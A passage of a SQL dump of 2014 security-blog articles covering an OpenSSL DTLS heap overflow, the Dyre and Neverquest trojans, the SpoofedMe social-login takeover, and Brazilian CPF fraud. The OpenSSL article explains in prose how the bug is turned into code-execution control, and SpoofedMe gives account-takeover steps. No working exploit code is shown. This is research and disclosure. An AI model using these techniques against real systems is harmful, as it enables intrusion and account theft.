'https://securityintelligence.com/cms-hacking-2014-by-the-numbers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (481, 'CVE-2014-0195: Adventures in OpenSSL’s DTLS Fragmented Land', 'Mark Yason', '2014-12-8', 'Earlier this year, details of a remote code execution bug in OpenSSL’s   implementation were  . The following is a look at the bug, its process and the different ways attackers might leverage it for exploitation: On a high level, the bug allows writing past the end of a buffer allocated in the heap, allowing application data or heap metadata to be overwritten. This leads to application crashes or remote code executions, at worst. The bug is due to the way the   DTLS parser handles  . Specifically, it uses the message length specified in the initial fragment for the message buffer allocation, but it uses the message length specified in subsequent fragments to determine whether they are within range of the message. Consider the following fragmented ClientHello message that triggers the bug: \n When the initial ClientHello fragment is encountered, the parser will allocate a message buffer based on the specified message length (2, in this case). Next, the fragment data “A” (fragment offset = 0, fragment length = 1) is written to the message buffer: \n Then, when the second ClientHello fragment is parsed, the fragment offset and fragment length is checked to determine whether they are within the range of the message length: Notice that the check uses the message length specified in the current fragment being parsed ( ) and not the message length specified in the initial fragment. Therefore, the check will pass, causing the fragment data “B” (fragment offset = 2, fragment length = 1) to be written past the end of the allocated message buffer: \n As you may have observed, the bug is interesting in that an attacker has a relatively high control of where (fragment offset), what (fragment data) and how much data (fragment length) can be written. Now that we have an idea of what the bug is, let’s try to trigger it. For testing, an Ubuntu 14.04 x64 test VM is used. The libssl1.0.0 library is downgraded to a  , and the package containing the debugging symbols for the libssl1.0.0 library (libssl1.0.0-dbg) is also installed. Also, a copy of a   from the OpenSSL project is downloaded to the current directory. Finally, the   tool is invoked with the arguments “ ” and “ “; this causes the OpenSSL tool to listen on Port 4433 for DTLS connections. In the example below, the OpenSSL tool is run under   so that the out-of-bounds write is immediately caught: The valgrind log shows some important information, such as which code path caused the message buffer allocation (  ->  ) and which code path caused the out-of-bounds write (  ->  ). After understanding the bug, an interesting follow-up exercise is finding ways an attacker might leverage this bug to exploit a real service. This will serve as a great learning experience because it will teach us how attackers think, what their process is and what other weakness they might use to fully leverage the bug. For this task, I first searched for a service that uses OpenSSL’s DTLS component for secure connections, eventually leading me to Net-SNMP’s  . Note that the net-snmp build in Ubuntu has the DTLS option turned off by default, so I had to recompile the net-snmp package with   in order to enable DTLS. Once a target service is running, the next step involves attaching to the process, setting breakpoints to the functions ( ) that were called when the message buffer was allocated and looking at the allocations that occur just after the message buffer allocation. Understanding the allocations that occur after the message buffer allocation allows us to determine which data structures will likely be allocated adjacent to the message buffer (assuming the allocations fit a large enough free chunk or are performed from the top chunk), and therefore, targeted for overwrite. After a lot of experimentation, I eventually found that the following OpenSSL data structure, which is allocated almost immediately after the message buffer allocation, can be leveraged in order to convert the bug to a fairly limited “write arbitrary data to the address pointed to by pointers found in the process” exploit primitive: In the context of DTLS,   is a linked list item that is used to track fragmented handshakes. The interesting field is the   field, which, in turn, points to a   structure: The   structure contains information about the fragmented handshake message state, and more importantly, the message buffer pointer ( ). Every time a handshake fragment parsed, the related   of the handshake is retrieved,   is casted to a   and the fragment data (which is controlled by attackers) is read into the buffer pointed to by  : Therefore, using the bug to point   somewhere in the process address space so that   is aligned to a pointer, we can write arbitrary data to wherever   points to. To illustrate with an example, suppose the process address space contains the pointer 0x12345678 at address 0x401058. Assuming that the   field is at offset +0x58 of the   structure, if we use the bug to point   to 0x401000, the parser will treat 0x401000 as a   structure. Therefore, we will be able to write arbitrary data to 0x12345678 because it will be treated as the message buffer pointer: \n We now have a fairly limited exploit primitive that allows us to leverage pointers in the process address space. The next question then is, “What can we do with it?” Again, after a lot of experimentation and trying out different ideas, I think these two are pretty interesting: Instead of leveraging existing pointers in the process address space, we will fill the heap with the address that we want to write data to. This involves spraying the heap with a target address. This is done via multiple DTLS connections that each send a large handshake message containing a repeating series of the target address (0x4141414141414141 in the example below). After the heap spray, the bug is used to point   to a hard-coded heap address (0x04141414 in the example), where I think (and hope) the series of 0x4141414141414141s are potentially written, causing   to point to 0x4141414141414141: As you may have guessed, the downside of this approach is that the hard-coded heap address is unreliable, which is true in the case of snmpd because several uncontrolled allocations will fill the heap in addition to the sprayed target address. Nonetheless, this is an interesting approach for further transforming the bug into a WriteN (write arbitrary data anywhere in the process address space) exploit primitive: \n Another approach is taking advantage of the absence of address randomization in cases where ASLR or PIE is disabled. In the case of Ubuntu, it turns out that PIE is not enabled for snmpd; this means that the snmpd executable is always mapped at a static address (0x400000): Because of this, it is possible to leverage interesting pointers stored in the snmpd executable address range and write arbitrary data to where they point at. An example of this is the   pointer located at 0x606FE0 in the   section of snmpd: In turn, that pointer points somewhere in the writable   section of libc: Looking at the data near   in the libc, we can see that  +0x18 is an interesting function pointer — which is actually a function pointer dereferenced by   when requesting additional memory from the system: Therefore, for execution (RIP) control, we will use the bug to point   to 0x606F88 (0x606FE0-0x58) so that   points to   in libc, causing a write to  +0x18 with an arbitrary address. When   dereferences the controlled function pointer, RIP control is achieved: After reliably controlling RIP within the amount of time I allocated for research, I declared game over and moved on. However, that is not to say that the consequences of the bug are limited to the ones I described. A determined   with a lot of spare time can definitely write a complete and reliable remote exploit using the bug. Also, looking back and thinking like an attacker, converting the bug into an exploit primitive involves a lot of experimentation. It is really a creative but long and laborious process. I lost track of how many times I had to restart the service, attach to the service, explore the heap, think, try an idea, crash the service and start the process all over again. In the end, an attacker’s persistence is what transforms software bugs into working reliable exploits, and as  , it is good to always keep that in mind as we read and write our code, triage and fix our bugs and evaluate the use of exploit mitigations in our products.', '\'OpenSSL\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/cve-2014-0195-adventures-in-openssls-dtls-fragmented-land/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (482, 'Protecting Against the Dyre Trojan: Don’t Bring a Knife to a Gunfight', 'Ori Bach', '2014-12-8', 'Since its first appearance in June 2014, the Dyre Trojan has reportedly been used in a succession of phishing campaigns across the globe, including attacks against major brand names such as the Royal Bank of Scotland, Citigroup,   and Bank of America. An analysis of Dyre’s configuration file shows that the malware’s target list now includes over 100 banks. With new banks being targeted on a weekly basis, the Trojan has created industrywide concern. At the heart of the Trojan’s successful man-in-the-middle (MitM) attacks is a technique called “browser hooking.” This technique allows the malware operators to route unsuspecting customers to fake banking websites, where they are tricked into surrendering their login credentials. The stolen credentials are then used to conduct an account takeover (ATO) from a spoofed device, through a proxy or directly from the infected PC by the use of remote access tools. Attempts to combat   with traditional fraud controls such as antivirus, authentication, statistical risk engines and device IDs have proven to be ineffective. The simple answer is that those controls were put in place to stop a previous generation of threats and were never designed to combat today’s sophisticated malware attacks. Authentication was never designed for a situation in which the criminal can forward authentication requests to the user who is browsing a fake website. Device identification did not take into account the latest generation of device-spoofing techniques. Antivirus software, which relies on identifying known malware signatures, was never designed to detect a fast-evolving Trojan such as Dyre, which sometimes releases a new binary code version every three days. Traditional risk engines based on analysis of session request and transactions are especially challenged by the malware modus operandi because they simply lack data on the full fraud life cycle. Critical parts of the Trojan’s attack occur on the victim’s PC and on a fake website, making them completely invisible to risk engines. The data that risk engines do obtain is inaccurate or heavily compromised by the Trojan. For example, session data, which is used by risk engines, can be easily altered or spoofed to mimic requests sent from the victim’s browser. Users are tricked into answering authentication challenges through the fake website. As a result, risk engines often miss the actual fraud attacks. To make matters worse, Dyre’s developers are constantly adding more fraud capabilities to the malware. According to an analysis conducted by IBM Security Trusteer researcher Lior Keshet, this malware has incrementally evolved to include capabilities for faster monetization of stolen credentials, data collection and remote access tools. The monetization tools shorten the time from the moment a user unsuspectingly surrenders his or her credentials to the fake website to when the ATO attack is complete. In fact, in many cases analyzed by IBM Security Trusteer, the account takeover attempt was so fast that the victim was still navigating the fake website after the criminal completed a funds transfer to a mule account. Recently added data collection capabilities allow the Trojan to gather information regarding the infected PC’s browser, cookies, certificates and OS attributes. These attributes can be used to spoof the device used in the ATO by making it appear to be the victim’s device. Remote access tools allow the criminal to take full control over the infected PC and perform the ATO attack directly from the user’s actual device. Device identification solutions are rendered useless against this type of attack. In fact, Dyre’s sophistication has grown by such an extent that its configuration file has now ballooned from less than 20 lines of code in early releases to more than 1,000 in the latest. The term “to bring a knife to a gunfight” was made famous by the movie “The Untouchables,” which depicts law enforcement’s fight against notorious gangster Al Capone. Attempts to make a case against Capone for his outright crimes always failed. For instance, witnesses against him had a tendency to “disappear.” The authorities took an innovative approach for the time and charged Capone with tax evasion. Capone had no way to explain the source of his huge income and was subsequently sent to prison. While Dyre is adept at circumventing traditional detection methods, it can be combated with a fresh approach that collects data on the full life cycle of the fraud event, including the very techniques that Dyre uses to mask its activity. More specifically, Dyre attacks can best be mitigated at two points in the fraud life cycle: during the initial infection or when the criminal attempts to use the stolen credentials to take over the victim’s account. Dedicated   against financial malware can identify unique attributes of the malware and prevent its installation process from completing. As an added benefit, while repelling the attack, endpoint protection will also alert the bank’s security department to the fact that it was targeted, providing valuable advanced notice. Since not all PC users install endpoint protection, banks still need an accurate way to detect Dyre attacks. The key to accurately detecting this malware during the ATO attempt lies in gathering evidence on the full life cycle of the fraud event, including activities performed before the user logs in and evidence of the infection. Sensors collecting this data must create a consistent TCP-level fingerprint that can correlate the various stages of the attack from infection to the ATO attempt. These sensors must also be able to penetrate Dyre’s various masking techniques, such as spoofing, the use of proxy and remote access tools. Once the data has been collected and analyzed, a clear and definitive picture of the fraud can emerge, allowing for accurate, real-time detection. , a solution that deploys advanced sensors to collect evidence on the full life cycle of fraud, has successfully detected multiple Dyre attacks with little to no false positives. The final chapter of the fight against Dyre and MitM attacks is far from written. Criminals looking to mimic Dyre’s success will undoubtedly release a chain of copycat malware. Additionally, the prospect of Dyre being offered as fraud-as-a-service is also daunting since it will allow the malware to proliferate well beyond its current scope. For those tasked with protecting their firms from Dyre, the lesson from “The Untouchables” holds true: Don’t bring a knife to a gunfight. Instead, bring the right kind of tools for the job.', '\'Banking\', \'Banking Trojan\', \'Dyre\', \'Malware\', \'Man-in-the-Middle (MitM)\', \'Trojan\'', 'https://securityintelligence.com/protecting-against-the-dyre-trojan-dont-bring-a-knife-to-a-gunfight/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (483, 'New Neverquest Variant Spotted in the Wild', 'Ilya Kolmanovich', '2014-12-5', 'IBM Trusteer researchers observed a new variant of the Neverquest malware over this past November. We observed a large increase in infection numbers, which led us to discover the updated threat. This new variant performs two new major changes, with a modified installation process and a new communication pattern. This variant targets   worldwide, with a focus on North America. The following graphs illustrate the number of infections worldwide based on   users during the past three months:     During our research, we discovered that Neverquest infections are supported by multiple downloaders, including Zemot, which was dropped by the Kuluoz phishing emails campaign, and the Chanitor downloader that uses   as a proxy to fetch its payload, which is hosted on the Tor network. We also noticed that drive-by exploit kits support the distribution of Neverquest, as seen in Stage 1 of Figure 3. Once the dropper is being executed in the compromised machine, it drops the Neverquest DLL Module in the %TEMP% folder, then uses   to execute it. Next, it creates a copy of itself in %Appdata% or %Programdata% (Windows XP or Windows 7, respectively), which can be seen in Stage 2 and Stage 3 of Figure 3. After that, it uses the CreateRemoteThreat application programming interface function to inject the malicious code into numerous legitimate Windows processes. Finally, the dropper is deleted by the injected Explorer.exe process. Interestingly, this type of malware deploys several tricks in order to bypass removal by security products, such as “recurring runkey” and a “watchdog” for its DLL module. Recurring runkey is a technique in which malware keeps on writing its persistency entry in the Windows registry using an infinite loop that will assure that even if this entry is removed, it will be rewritten. Watchdog is a technique made by malware that promises its vital components will not be removed. The   taps the location of its components and reproduces them once they’re terminated. When one of them is being deleted, it is immediately reproduced by an injected process. There is also a change within the two-stage installation process related to its configuration, which is being written to a new registry entry. In old variants: In the new variant: Note that the GUID referenced above is being calculated by a known algorithm that was implemented since the first variants of Neverquest, so we will not describe this detail here. Neverquest implements a new communication pattern with its command-and-control server, as seen below:   The following URL scheme was found in the malicious code: Values representation:  – Request type, which includes the following options: , Internal ID \n , Bot ID \n , Build ID Among Neverquest’s tricks, you will find video and screenshot capture, man-in-the-middle and man-in-the-browser capabilities and a “Pony module,” which enables it to harvest email clients, file transfer protocol and stored browser credentials. It also uses SOCKS Proxy, virtual network computing and back-connect components in order to gain control of compromised endpoints. Additionally, we have seen a webinjects configuration that determines how it operates locally, which contains a list of 300 targeted entities worldwide. Although most of them are financial, there are other interesting sectors such as gaming, social networks and media. We have seen Neverquest evolve and change its form of activity several times in the past year, and with each iteration, the reason for the change is to try to bypass security products. Security products that implement a naive approach will be bypassed with every change that Neverquest implements until the new modification is studied. Until then, these products are ineffective. IBM Security Trusteer researchers are closely monitoring this variant while providing appropriate protection against this new type of   and many others. These solutions can detect, mitigate and remediate infections to protect the enterprise and your customers.', '\'Banking Trojan\', \'Finanacial Malware\', \'Malware\', \'Neverquest\', \'Trojan\', \'Vawtrak\', \'Zemot\'', 'https://securityintelligence.com/new-neverquest-variant-spotted-in-the-wild/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (484, 'SpoofedMe Social Login Attack Discovered by IBM X-Force Researchers', 'Or Peles', '2014-12-4', 'is a popular mechanism that offers a convenient way for users to quickly gain access to their Web accounts without the need to enter per-site credentials, allowing for a cohesive and integrated Web experience. It works by letting a user log in to cooperating sites that support social login by using their existing external account as an identity provider (such as a Facebook, Google+ or LinkedIn account). One can recognize a site supporting social login by the “Sign In With Facebook/LinkedIn/etc.” button. IBM X-Force’s Application Security Research Team has devised a logical attack that allows a malicious user to intrude into user accounts on a relying website — a website that relies on authentication assertions passed to it by the identity provider — by abusing the social login mechanism. A specific instance of this attack allowed an attacker to intrude into a Slashdot.org user account by using the “Sign In With LinkedIn” service. It should be noted that LinkedIn responded quickly and fixed this vulnerability after the attack was disclosed. Once logged in, the attacker has complete access to the victim’s account. For example, the attacker could access the victim’s private information and impersonate him or her by posting spam messages. \n IBM X-Force has dubbed this attack “SpoofedMe,” and it requires the following combination of flaws: For the attack to work, the victim’s email address must not already be used by an existing account at the vulnerable identity provider. In short, to perform the attack, a   registers a spoofed account within a vulnerable identity provider using the victim’s email address. Then, without having to actually confirm ownership of the email address, the attacker will log in to the relying website using social login with this fake account. The relying website will check the user details asserted from the identity provider and log the attacker in to the victim’s account based on the victim’s email address value. The best way to illustrate the attack is through an example. For ease of explanation, we will stick with the example of Slashdot as a vulnerable relying website and LinkedIn as a vulnerable identity provider throughout this post, though LinkedIn has fixed its vulnerability and other providers and relying websites were also affected. As previously mentioned, social login is an authentication mechanism that allows a user to use a single account within an identity provider (such as Facebook, Google+ or LinkedIn) for signing in to various third-party websites. In recent years, the concept of social login has increased in popularity and is commonly seen in websites’ login pages in the form of a sign-in button. Today, most social login implementations are based on the OAuth 1.0 and 2.0 authorization protocols, extended to support authentication. The following three players are involved in a social login authentication process: As the attacker, we would like to be able to intrude into an existing user’s (the victim’s) account within a website supporting a social login option. To achieve this, we will impersonate the victim with the help of the social login authentication process. The social login attack depends on a combination of two things: the identity provider vulnerability and one of the relying website design problems described below. As seen in Step 4 above, the identity provider (LinkedIn) transfers the user’s identity fields to the relying website (Slashdot). One of the fields is the user’s email address. Many identity providers allow users to create identity accounts using any email address they wish as long as it isn’t already in use by another account within the identity provider’s database. The vulnerability we identified is that some identity providers agree to supply the account’s email addresses as part of the social login authentication process even when the user’s ownership of this email address has not been positively verified. In fact, intuitively, it is good practice to only supply email addresses that have been verified, as most identity providers do. See Identity Provider Vulnerability section in   for more info. Both of the following design problems count on the website’s trust in the email address field supplied to it during the social login process: As a side effect of Step 1, the victim will receive an “email verification request” that may raise his suspicion, but his response will almost certainly be too late to prevent intrusion to his account. Before announcing the attack, we reviewed the popular identity providers and adhered to IBM Security’s responsible disclosure policy by privately disclosing the attack details to the ones found vulnerable and waiting for them to apply their fixes. Here are some interesting providers’ cases that are worth mentioning: Below is a video of the attack (taken before LinkedIn patched its vulnerability), on a Slashdot.org website account, using LinkedIn as the vulnerable identity provider. The video shows how easy it is for an attacker to perform the attack: We start by creating a Slashdot account that will be used as our victim. We do it by signing in to Slashdot using the victim’s Gmail account. Then, as the attacker, using another browser that doesn’t share cookies with the former browser, we create a LinkedIn account with the victim’s email address and leave it in an email unverified state (Step 1). Next, we go to Slashdot and use the “Sign In With LinkedIn” login option, authenticating with our newly created LinkedIn account (Steps 2 and 3). As a result, Slashdot is passed the victim’s email address and logs the attacker in to the victim’s account (Step 4). We strongly recommend that developers of both websites that use   and future identity providers follow the Mitigation section in  . While fixing the identity provider vulnerability would be enough for this attack to be blocked (attack Stage 4 won’t be reached), it is important for websites that are vulnerable to fix the website design problem because it may expose their users to similar attacks. We would like to thank the security teams of LinkedIn, Amazon, MYDIGIPASS and others for efficiently handling this  . Or Peles ( ), IBM Security Systems Roee Hay ( ), IBM Security Systems', '\'Amazon\', \'IBM X-Force Research\', \'LinkedIn\', \'Vulnerability\', \'X-Force\'', 'https://securityintelligence.com/spoofedme-social-login-attack-discovered-by-ibm-x-force-researchers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (485, 'IBM X-Force Still Ahead of the Threat 86,000 Vulnerabilities Later', 'Pamela Cobb', '2014-11-24', 'As security threats to network environments have evolved, so has the IBM X-Force Research and Development group. When the group was founded in the late 1990s, its vision was to develop protection strategies and educate customers. The benefit of strategic thinking means that those two goals are still applicable today. If you’re unfamiliar with the team, I encourage you to take a few minutes to watch this overview video featuring Chris Poulin, one of our research strategists: In addition to having a wonderfully expressive eyebrow, Poulin is also an accomplished speaker and author on a wide array of security topics. If you want to hear more from him but can’t catch him in person at one of our cybersecurity roadshows or client events, you can watch his   or read any of his  . Poulin is just one example of the experts on the team. Earlier this month, Robert Freeman, another of those brilliant minds, disclosed a   that has been around for 19 years. This vulnerability allows an attacker to gain full control of the browser in any version, starting with IE 3.0. This vulnerability has been given any number of nicknames, from “Unicorn” to “Godmode,” and it is just one of the over 86,000 vulnerabilities cataloged in the X-Force database, one of the oldest commercially available vulnerability databases. Thanks to the work of our team of researchers going back to the 1990s, X-Force has been able to build behavior-based protection strategies that can stop advanced threats. Perhaps you remember a little vulnerability named Shellshock? Thanks to those strategies, IBM Security Network Protection customers were protected against   exploits way back in 2007. The researchers had the foresight to create algorithms to block potentially malicious behavior such as shellcode injections. With IBM’s acquisitions in the security area, X-Force has expanded its research efforts into new areas. In Trusteer, it added a team of malware experts such as  , who uncovered new uses for “classic” banking malware in the case of Citadel being modified to attack  . I’d also be remiss if I didn’t include the efforts of our mobile application security researchers, such as  , who keep us all informed of emerging threats to mobile platforms. There is no way I could list all the security experts that contribute to the efforts to develop protection strategies for IBM customers, so rather than publishing a yearbook-like list of names, let’s talk about how these experts work together to educate the public. Outside of the insights posted on SecurityIntelligence.com, X-Force publishes its  , authors white papers, produces webinars and posts videos to educate not only IBM clients, but also the public at large on emerging trends in the security industry. All these assets are now conveniently located in its  . The IBM Managed Security Services group, which monitors real-world threats to IBM clients, also publishes   on zero-day attacks such as Shellshock and industry-specific views on sectors such as finance and health care. X-Force also presents at industry and IBM events such as InterConnect 2015 in addition to its cybersecurity roadshows. If you’re able, I highly encourage you to take advantage of the many exciting  , either virtually or in person, that X-Force has planned for 2015.', '\'IBM X-Force Research\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/ibm-x-force-still-ahead-of-the-threat-86000-vulnerabilities-later/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (486, 'Spotlight: CPF Fraud in Brazil', 'Alex Karlinsky', '2014-11-20', 'Internet fraud in South America has been widespread and rapidly growing in sophistication, with Brazil leading the pack. According to a survey published by  , in 2013 alone, losses due to financial fraud have surpassed $1 billion. Lax cybercrime laws are to blame, as well, giving rise to fraudsters who are notorious for their inventive techniques to defraud Brazilian victims, utilizing region-specific malware (such as two new   discovered by IBM Trusteer researchers in mid-July) and various online thievery schemes.\n While the more familiar aspects of identity theft involving e-commerce and online banking fraud are common in many parts of the world, one particular element is unique to identity theft in Brazil. Despite being a key factor in many successful fraud operations in the country, Cadastro de Pessoas Físicas (CPF) fraud is often overlooked.\n A CPF is an 11-digit taxpayer identification code issued by the Brazilian Federal Revenue agency. Taxpayers obtain their number by filling out an online form or applying for one through a post office or bank.\n When CPF was originally instated, only financial institutions were allowed to ask customers for their CPF. Nowadays, however, CPF is used in a wide array of day-to-day activities in Brazil, with its convenience and ease of use driving its growing utility in personal and commercial activities. Brazilians typically present a CPF when signing up for a bank account, obtaining a credit card, applying for jobs and paying taxes. CPF numbers are also used to identify customers who wish to purchase anything from a mobile phone to a piece of furniture.\n Since CPF has grown to be the most common form of identification in Brazil, it is no wonder it’s being used in fraud schemes there. Common fraud scenarios involving a stolen CPF identity include opening a bank account or obtaining loans on behalf of a legitimate CPF holder, which, unsurprisingly, ends up as debt in the victim’s name. CPF numbers can also be used in schemes that will reveal a victim’s complete credit card information to the fraudster.\n Fraudsters also favor CPF fraud over traditional credit card fraud because activities involving CPF identification are not readily available for holders to track. While credit card holders can easily check their transactions and statements online, it is impossible to do the same with CPF. To check whether any anomalies have been found within their CPF history, CPF identity owners must consult with and receive verbal confirmation from a banker or government official.\n Brazil does offer paid online services that let users more closely track their CPF activity, but many locals are not aware of that option, nor do they have the need to regularly track their CPF activity. As a result, CPF holders realize they are fraud victims too late in the game, typically when they attempt to make a purchase or when their request to issue a new credit card is declined.\n Let’s look at the information on a CPF card. The visual structure of the card is rather simple, with no holder picture printed on it to authenticate the owner. The reason likely lies in the fact that the card was originally meant for tax-filing purposes and presented alongside the holder’s official ID — which rarely happens in Brazil otherwise. The card presents a number, the person’s name and a date of birth. While the card does not typically expire, it can be revoked by the government if a citizen fails to pay federal taxes. This is a rare occurrence; Brazilians would sooner fill out an annual tax exempt declaration than have their CPF card revoked. The reverse side indicates that the card must be presented alongside official identification and shows its date of issue.\n \n \n While simplistic in its personally identifiable information (PII), this identification element is used very loosely in Brazil.   confirmed that Brazilians give out their CPF without hesitation, thinking little of identity theft and its consequences. More than 94 percent of survey participants wrote their CPF on the questionnaire itself. Absurdly enough, the questionnaire was served to the participants as part of an Internet fraud awareness course.\n Naturally, fraudsters take advantage of low-hanging fruits and find CPF cards to be an ideal target. Much like the   underground, the Brazilian fraud community operates an evolved ecosystem that facilitates CPF fraud-as-a-service with advice, accomplices and paid services to help newcomers. All you need to bring into the mix is a list of valid CPF card numbers, which can be obtained through phishing or malware attacks.\n \n \n Similar to how thieves obtain stolen credit cards and PII online, fraudsters in Brazil can key in a CPF number and pay a small fee for full information on the victim. Details include full name, mother’s name, date of birth, address, ID number and phone number.\n Most of these underground sites query government and privately held websites for CPF information and serve it to their dubious clientele. Fraudster service sites are typically operated by cybercrime experts that specialize in finding online resources that, when queried, return much more information than they should — and for little or no effort.\n That same information may, of course, be obtained by directly paying a fraudster to do the dirty work rather than working through a service website. Once a fraudster gets hold of the full victim information, the road to a successful fraud operation is open. The next step is a custom spear-phishing email, unique to the victim, that carries concealed malware in order to infect the computer and harvest even more information.\n The image below was captured on a Brazil-based underground forum and offers CPF fraud advice directly from the forum’s administrator.\n \n \n The next two images show an online interface designed to help fraudsters uncover full personal information on their future victims by a CPF number.\n \n \n \n Brazil’s large population and the fact that the country is an e-commerce leader in South America are just two factors that make it an extremely lucrative place for  . Throw in a wide gap in public awareness regarding identity theft and   and you have sufficient motivation for new fraud methods and a rapidly growing criminal community pushing fraud losses through the roof. In Brazil, CPF fraud remains an important foundation in a vast array of geospecific cybercrime schemes that is not likely to subside, especially if common Brazilians cannot easily and quickly track their CPF activity.', '\'Boleto Malware\', \'Brazil\', \'Financial Fraud\', \'Fraud\', \'Malware\', \'Online Banking\'', 'https://securityintelligence.com/spotlight-cpf-fraud-in-brazil/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (487, 'Five Ways Your Security Tools Are Failing You', 'Paul Kaspian', '2014-11-20', 'We have witnessed a dramatic shift in the nature of enterprise security in the past 10 years. The individuals attacking our networks are no longer curious college students, but highly sophisticated professionals working within well-organized teams. The sheer number of vulnerabilities has remained a major challenge, while the attacks exploiting these vulnerabilities are constantly changing to circumvent security tools. We have encountered the “next big threat” seemingly every year and raced to put additional   and technologies in place to combat it. The end result is a complex set of disparate and dated security tools that might not be up to the task at hand. The following are five ways the infrastructures we have created may be failing us:\n One shift that has taken place is the rapid mutation of attacks and attack techniques. As a result, many traditional, “static” security protections such as signature-based antivirus and   have failed to keep pace. The amount of time needed to sufficiently research a new attack then write, test and deploy a signature is an overhead we can’t afford.\n We need technologies that are rapidly updated and capable of stopping never-before-seen attacks. We are starting to see behavioral-based technologies emerge that are more effective and produce minimal false positives. These types of technologies should slowly replace your traditional static methods in the areas of intrusion prevention and anti-malware.\n In our efforts to keep up with the next big thing in security, we have created an infrastructure that consists of dozens of point solutions from many vendors. Vendor diversity can be positive for your security posture, but many of us have created a problem I refer to as “security sprawl,” where our security infrastructure has outpaced our ability to successfully integrate and use it.\n It is important that we effectively integrate various technologies in our security arsenal in order to have a fighting chance of detecting multifaceted threats such as advanced persistent threats. It is also an important component to let us sufficiently manage our own security through finite resources. Organizations should look for integration points between their different security protections to make them more effective and manageable.\n Poor integration also creates another inherent issue: The data generated by the totality of our different security tools is overwhelming. Security has become a  . The sheer number of events and data being generated from our firewalls, IPS sensors, etc. would require a dedicated team to have any hope of keeping up — and producing debatable results.\n If you can’t understand what your security tools are telling you or what to focus on, you can’t take action. We need a way to boil all our security data down to the events that really matter. This way, we can actually take action to improve our security and make necessary adjustments and improvements. The focus here should be on creating higher-level “dashboarding” that can provide you with meaningful information.\n You’ve spent hundreds of thousands or even millions of dollars over the past several years beefing up your security posture. Everyone on your team has been trained and certified, and everything has been actively deployed. How effective are those tools? Has your security gotten better or worse? Which gaps do you have in your current security posture? How do you measure security effectiveness?\n Unfortunately, many tools you are using may be providing you with a false sense of security. Just because a particular tool is not alerting at the moment doesn’t mean you’re not under attack. It is vital that you continue to audit your security posture both internally and externally using third-party penetration testing. This should be an ongoing process to ensure your tools and technologies are doing what you intended them to do.\n The importance of a sound emergency response plan cannot be overstated. This plan should clearly outline the steps that will be taken in the event of a security breach. In addition to this plan, your security tools should support you with the right amount of data and forensics capabilities. This goes back to the idea of having actionable data. In this case, you need detailed intelligence on what happened, the data that was accessed and whether that data was exfiltrated. Even if your emergency response plan includes the help of a third party, internal tools and technologies should support your own investigation and provide your third-party vendor with a head start on the forensics and investigation it will perform for you.\n As cybersecurity continues to evolve, security professionals’ approaches will require continual change to meet future challenges. This requires both short-term planning and response and long-term planning and strategic investment. Many times, this will require reinventing approaches to ensure we are prepared for threats we are encountering today as well as future threats.', '\'Incident Forensics\', \'Security Intelligence\', \'Security Tools\'', 'https://securityintelligence.com/five-ways-your-security-tools-are-failing-you/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (488, 'Cybercriminals Use Citadel to Compromise Password Management and Authentication Solutions', 'Dana Tamir', '2014-11-19', 'In these days of endless breaches, securing user access by enforcing unique, complex passwords and strong authentication is imperative. The onslaught of data breaches in the past year alone, with the majority of the breaches involving  , forced users to constantly change their passwords. With many users still trying to use the same passwords over and over, and others struggling to remember their newly created complex ones, a password manager becomes a smart and responsible solution for users – and attackers have taken notice. Always looking for ways to log in as a legitimate user, cybercriminals try to guess, steal or brute force passwords. They try to bypass authentication mechanisms by tampering with user requests and tricking the application into thinking that they’re authenticated. Secure access plays a critical role in data breach prevention – whether it’s access to personal online services for banking, social networks, e-commerce sites, or corporate applications like webmail, software-as-a-service (SAAS) and platform-as-a-service (PASS) services. Various solutions have been designed to simplify and streamline secure access. Password managers, for example, relieve the user of the need to remember all the unique and complex passwords that he or she uses to access both personal and work-related applications. Instead, the user need only remember one complex master password, which is much easier. When you provide the master password, these solutions will enable secure access to your applications and services. Many applications require additional authentication of the user or devices before access is granted. In addition to passwords, which are “something you know,” these authentication processes may require “something you have,” such as a physical device or certificate. Common authentication methods require the use of smart cards, software certificates or digital signatures. The combination of a password you know and an authentication “proof” that you have is powerful. The strength of these solutions is based on the confidence that it is hard to compromise or circumvent something you know or something you have — or moreso, the combination of the two. However, what happens when cybercriminals use sophisticated malware to steal master passwords and compromise authentication solutions? \n The   is not new. It is a   that has already compromised millions of computers worldwide. Once Citadel installs on a machine, it opens communication channels with a command-and-control (C&C) server and registers with it. The malware then receives a configuration file that tells it how it should operate, which targets what to look for, what type of information to capture, which functions to enable and even provides information about alternative C&Cs that allow the attackers to take down an exposed C&C and still operate the malware from a new C&C. As long as the malware is communicating with the C&C, the configuration file can be updated with information about new targets, activities and C&C destinations. IBM Trusteer research found that an average of   worldwide is infected with massively distributed APT malware at any point in time. Massively distributed malware has been discovered by IBM Trusteer’s Service team in practically   customer environment in which they’ve worked. Since millions of machines are already infected with Citadel, it is easy for attackers to take advantage of this malware in new cyberschemes. All attackers need to do is provide a new configuration file to the millions of existing instances and wait for infected machines to access the targets. It is important to note that Citadel is highly evasive and can bypass most   security systems. It can stay idle on a user’s machine for weeks, months and even years until it is triggered by a user action. This means that many users and organizations do not know that their machines are already infected, and the existing infection can be quickly turned against them. Recently, IBM Trusteer researchers found a new configuration of Citadel that is being used to compromise password management and authentication solutions. It instructs the malware to start keylogging (capturing user keystrokes) when some processes are running. The relevant part of the configuration is shown below (in IBM Trusteer’s proprietary format): The following are targeted processes: IBM Trusteer found this new Citadel configuration file on a user machine protected by IBM Trusteer. This machine can be located anywhere in the world and used by any type of user, such as a consumer using Web services, an enterprise employee using corporate systems, a contractor that works with other organizations — we cannot know. The machine was already infected by Citadel when IBM Trusteer Apex was installed on it. Therefore, it is unknown exactly how it became infected. 